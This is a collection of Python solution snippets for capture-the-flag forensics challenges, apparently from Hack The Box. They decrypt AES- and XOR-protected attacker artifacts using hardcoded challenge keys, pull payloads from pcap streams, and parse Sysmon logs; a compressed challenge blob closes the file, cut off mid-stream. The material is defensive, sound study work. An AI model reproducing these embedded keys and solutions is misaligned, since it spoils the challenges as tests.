            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        &#34;&#34;&#34;
        ascii_code = ord(c)
        if 33 &lt;= ascii_code &lt;= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def textFromPDF(self, file=None):
        &#34;&#34;&#34;
        Extracts text from a PDF file.

        Args:
            file (str): Path to the PDF file. Defaults to the challenge file.

        Returns:
            str: The extracted text.
        &#34;&#34;&#34;
        if file is None:
            file = self.challenge_file

        with pdfplumber.open(file) as pdf:
            text = &#34;&#34;
            for page in pdf.pages:
                text += page.extract_text()
        return text

        # /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, self.file)

        self.aes_key_base64 = &#34;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&#34;
        self.aes_key = base64.b64decode(self.aes_key_base64)
        encrypted_base64 = open(self.challenge_file, &#34;r&#34;).read().strip()
        decrypted_text = self.decrypt_string(encrypted_base64, self.aes_key)
        print(&#34;Decrypted text:&#34;, decrypted_text)

        # /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def decrypt_string(self, encrypted_base64, key):
        full_data = base64.b64decode(encrypted_base64)

        iv = full_data[: AES.block_size]
        encrypted_message = full_data[AES.block_size :]

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_bytes = cipher.decrypt(encrypted_message)

        pad = decrypted_bytes[-1]
        decrypted_bytes = decrypted_bytes[:-pad]

        return decrypted_bytes.decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def main(self):
        encrypted_text = &#34;ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=&#34;

        password = &#34;vudzvuokmioomyialpkyydvgqdmdkdxy&#34;

        decrypted_text = self.decrypt(encrypted_text, password)
        print(&#34;Decrypted text:&#34;, decrypted_text)

        # /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = SHA256.new()
        d.update(password.encode(&#34;utf-8&#34;))
        key = d.digest()[:key_length]
        iv = salt.encode(&#34;utf-8&#34;)[:iv_length]
        return key, iv

        # /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def decrypt(self, ciphertext_base64, password):
        ciphertext = base64.b64decode(ciphertext_base64)
        salt = &#34;tbbliftalildywic&#34;

        key, iv = self.derive_key_and_iv(password, salt, 32, 16)

        cipher = AES.new(key, AES.MODE_CBC, iv)

        plaintext = cipher.decrypt(ciphertext)

        plaintext = plaintext.rstrip(b&#34;\x00&#34;)

        return plaintext.decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def main(self):
        # Get packets from the pcap file
        self.pcap_open()

        tcp_stream_5 = self.get_tcp_stream(5)

        tcp_stream_5 = self.creating_stream(packets=tcp_stream_5)[0]

        # To get the payload
        data_24 = bytes(tcp_stream_5[25][TCP].payload)
        data_45 = bytes(tcp_stream_5[45][TCP].payload).decode()

        # print(base64.b64decode(data_24))

        payload_base64 = data_45.split(&#39;&#34;&#39;)[1]

        payload = base64.b64decode(payload_base64).decode()
        print(payload)

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def get_tcp_stream(self, number):
        tcp_streams = self.creating_stream()
        return tcp_streams[number]

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def stream_identifier(self, pkt):
        if TCP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            # Create a unique identifier for both directions
            return tuple(sorted([(src, sport), (dst, dport)]))
        return None

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def creating_stream(self, packets=None, save=False, return_dict=False):

        if packets is None:
            packets = self.packets

        # Dictionary to hold streams
        tcp_streams = {}

        # Iterate over packets to group them into streams
        for pkt in packets:
            if TCP in pkt:
                stream_id = self.stream_identifier(pkt)
                if stream_id:
                    if stream_id not in tcp_streams:
                        tcp_streams[stream_id] = []
                    tcp_streams[stream_id].append(pkt)

        if return_dict:
            return tcp_streams

        tcp_streams = list(tcp_streams.values())

        return tcp_streams

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.folder_logs = self.Path(self.folders[&#34;files&#34;], &#34;Logs&#34;)
        self.folder_xml = self.Path(self.folders[&#34;data&#34;], &#34;xml&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def xor_decrypt(self, data: bytes, key1: bytes, key2: bytes = None) -&gt; bytes:
        output = bytearray(len(data))
        key1 = bytearray(key1)
        if key2:
            key2 = bytearray(key2)
        for i in range(len(data)):
            k1 = key1[i % len(key1)]
            if key2:
                k2 = key2[i % len(key2)]
                output[i] = data[i] ^ k1 ^ k2
            else:
                output[i] = data[i] ^ k1
        return bytes(output)

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def emilia_main(self):

        # Key from $a53Va (known good key)
        # NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==
        key1_b64 = &#34;NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==&#34;
        key1 = base64.b64decode(key1_b64)
        # key1 = base64.b64decode(key1)

        # Read the encrypted .secured file (Base64-encoded)
        with open(self.challenge_file, &#34;rb&#34;) as f:

            encrypted_b64 = bytearray(f.read())

        encrypted_data = base64.b64decode(encrypted_b64)

        # Try decrypting with single key
        decrypted_data_1 = self.xor_decrypt(encrypted_data, key1)

        # Try decrypting with both keys (if key2 is usable)
        # So one key is weird because in the powershell script it tried to decode it with UTF-8 and i think that would lead to an error
        # So there is a chance that only one key is used due to the try-catch brackets leaving one key null but im not sure.
        key2_str = &#34;n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ&#34;

        try:
            key2 = base64.b64decode(key2_str)
            decrypted_data_2 = self.xor_decrypt(encrypted_data, key1, key2)
        except Exception as e:
            print(f&#34;[!] Dual-key decode failed: {e}&#34;)
            decrypted_data_2 = None

        # Save both outputs as .bin files for analysis
        output_single_key = self.folfil(&#34;data&#34;, &#34;output_single_key.bin&#34;)
        with open(output_single_key, &#34;wb&#34;) as f:
            f.write(decrypted_data_1)
            print(&#34;[+] Decrypted with single key -&gt; output_single_key.bin&#34;)

        if decrypted_data_2:
            output_dual_key = self.folfil(&#34;data&#34;, &#34;output_dual_key.bin&#34;)
            with open(output_dual_key, &#34;wb&#34;) as f:

                f.write(decrypted_data_2)
                print(&#34;[+] Decrypted with both keys -&gt; output_dual_key.bin&#34;)

        key3_b64 = &#34;5xsGObjHQiPAGdzLgBEeI8u0YSJq76Eiyuf8wARS7qbtP4ntQY50yH8dzKZeCAsZn2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ&#34;
        key3 = base64.b64decode(key3_b64)
        decrypted_data_3 = self.xor_decrypt(encrypted_data, key3)
        output_join_key = self.folfil(&#34;data&#34;, &#34;output_join_key.bin&#34;)
        with open(output_join_key, &#34;wb&#34;) as f:
            f.write(decrypted_data_3)
            print(&#34;[+] Decrypted with join key -&gt; output_join.bin&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def getting_base64(self):
        sysmon_file = self.Path(
            self.folders[&#34;data&#34;], &#34;emilia&#34;, &#34;Sysmon_Operational.txt&#34;
        )
        with open(sysmon_file, &#34;r&#34;) as f:
            text = f.read()
        base64_strings = self.custom_re_match_base64_string(text)

        result = b&#34;&#34;

        for base64_string in base64_strings:
            decoded = base64.b64decode(base64_string)
            result += decoded
        return result

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def custom_re_match_base64_string(self, text: str, strict=False) -&gt; list[str]:
        &#34;&#34;&#34;
        Description:
        Find the base64 string in the text

        Args:
            text (str): Text to search for base64 string
            strict (bool, optional): If True, it will only return the base64 string. Defaults to False.

        Returns:
            str: list of Base64 string found in the text
        &#34;&#34;&#34;
        if strict:
            base64_pattern = r&#34;[A-Za-z0-9+/]{70,}={1,2}&#34;
        else:
            base64_pattern = r&#34;[A-Za-z0-9+/]{70,}={0,2}&#34;
        base64_strings = re.findall(base64_pattern, text)
        return base64_strings

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def main(self):
        self.emilia_main()

        # /home/figaro/CTF/Categories/Forensics/HTB/Pursue_The_Tracks/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = &#34;5UUfizsRsP7oOCAq&#34;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_save_data(self, data: any, filename: str, folder: str = &#34;data&#34;) -&gt; None:
        &#34;&#34;&#34;
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to &#34;data&#34;.

        Returns:
            None
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;wb&#34;) as f:
            pickle.dump(data, f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_load_data(self, filename: str, folder: str = &#34;data&#34;) -&gt; any:
        &#34;&#34;&#34;
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to &#34;data&#34;.

        Returns:
            any: Data loaded from pickle
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;rb&#34;) as f:
            return pickle.load(f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def load_compressed_data(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function to load the compressed data
        &#34;&#34;&#34;
        self.compressed_data = b&#39;BZh91AY&amp;SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4&#34;|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&amp;\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\&#39;\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&amp;F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&amp;\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&amp;M&amp;\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1&#34;\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df&gt;$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|&gt;\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo&#34;\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&amp;\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa&gt;E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0&#34;\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&amp;&amp;\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\&#39;\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm&lt;\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a&#34;J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18&gt;\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI&lt;\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80&lt;%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&amp;w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85&#34;.j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&amp;\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5&lt;\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08&lt;\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd&lt;q\r\xbb0\xc4Ac\x95.v\x94\x08&gt;\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&amp;\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q&#34;\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d&gt;\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0&gt;\xcf\&#39;7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02&#34;@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u&lt;\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|&gt;\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e&lt;\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c&#34;\x86\xa6\x9c&amp;,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff&#34;|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\&#39;\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r&gt;\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &amp;,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&amp;\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\&#39;\x04\xe0&amp;\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&amp;c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90&gt;\xc1\x97%B@\x12B&#34;u\xd5R\x0f\x10`&amp;\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5&lt;\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\&#39;\x04\xc1l&amp;\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&amp;\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5&#34;Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82&#34;\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc&#34;\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&amp;\xe7NQ\x9e\&#39;93M\x8f`!\xcc\x80#%\x04\xd2\xeb&#34;T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&amp;\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{&gt;_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e&lt;\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\&#39;Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e&#34;\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9&gt;\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\&#39;\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2&#34;\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\&#39;\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\&#39;\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\&#39;;r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99&lt;)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12&lt;{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5&gt;&#34;\&#39;\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8&#34;\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&amp;|&gt;\x13(&lt;\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 